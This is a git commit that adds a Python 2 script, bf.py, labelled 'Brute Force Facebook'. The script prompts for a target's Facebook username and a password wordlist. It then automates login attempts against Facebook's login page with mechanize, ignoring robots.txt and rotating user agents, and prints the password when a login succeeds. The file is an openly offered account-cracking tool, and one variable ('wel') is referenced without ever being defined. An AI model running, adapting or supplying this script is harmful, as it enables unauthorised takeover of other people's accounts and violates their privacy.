547f58a43d7e9971b8a8077c5ee9149cc4f19d61
Angga Kurniawan <67410461+anggaxd@users.noreply.github.com>
2020-08-09 20:59:14 +0700

    Update bf.py

--- bf.py
+++ bf.py
@@ -1,1 +1,87 @@
-Sabar Cuk Script Ny Error
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
+
+import os
+import sys
+import mechanize
+import cookielib
+import random
+
+
+logo="""
+\033[1;91m__________________ 
+\033[1;92m| ___ \  ___|  ___|
+\033[1;93m| |_/ / |_  | |_   
+\033[1;95m| ___ \  _| |  _|  
+\033[1;96m| |_/ / |   | |    
+\033[1;91m\____/\_|   \_|  \033[1;97mBrute Force Facebook
+\033[1;97m--------------------------------------------
+\033[1;97m➣ Author   : Angga Kurniawan     
+\033[1;97m➣ GitHub   : https://github.com/anggaxd
+\033[1;97m➣ YouTube  : ANGGA KURNIAWAN
+\033[1;97m--------------------------------------------
+                     
+"""
+os.system("clear")
+print logo
+email = str(raw_input("Target Username / ID Facebook : "))
+
+
+passwordlist = str(raw_input("Enter the wordlist name and path : "))
+
+
+login = 'https://www.facebook.com/login.php?login_attempt=1'
+
+
+useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+
+def main():
+	global br
+	br = mechanize.Browser()
+	cj = cookielib.LWPCookieJar()
+	br.set_handle_robots(False)
+	br.set_handle_redirect(True)
+	br.set_cookiejar(cj)
+	br.set_handle_equiv(True)
+	br.set_handle_referer(True)
+	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+	search()
+	print("Password does not exist in the wordlist")
+
+	
+	
+def brute(password):
+	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
+	sys.stdout.flush()
+	br.addheaders = [('User-agent', random.choice(useragents))]
+	site = br.open(login)
+	br.select_form(nr = 0)
+	br.form['email'] = email
+	br.form['pass'] = password
+	sub = br.submit()
+	log = sub.geturl()
+	if log != login and (not 'login_attempt' in log):
+			print("\n\n[+] Password Find = {}".format(password))
+			raw_input("ANY KEY to Exit....")
+			sys.exit(1)
+
+			
+def search():
+	global password
+	passwords = open(passwordlist,"r")
+	for password in passwords:
+		password = password.replace("\n","")
+		brute(password)
+
+		
+	total = open(passwordlist,"r")
+	total = total.readlines()
+	print wel 
+	print " [*] Account to crack : {}".format(email)
+	print " [*] Loaded :" , len(total), "passwords"
+	print " [*] Cracking, please wait ...\n\n"
+
+	
+if __name__ == '__main__':
+	main()
+
